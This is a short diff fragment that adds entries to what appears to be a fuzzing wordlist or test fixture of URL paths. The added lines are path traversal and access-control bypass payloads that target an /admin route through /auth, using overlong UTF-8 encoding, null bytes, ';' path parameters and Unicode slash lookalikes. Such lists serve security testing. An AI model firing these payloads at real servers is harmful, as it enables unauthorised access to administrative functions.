@@ -19,3 +19,8 @@
 /auth/..%5cadmin
 /auth//admin
 /auth/../admin
+/auth/..;/admin
+/auth/%c0%ae%c0%ae%c0%afadmin
+/auth/%2E%2E%2Fadmin
+/auth/..%00admin
+/auth/%e2%88%95admin
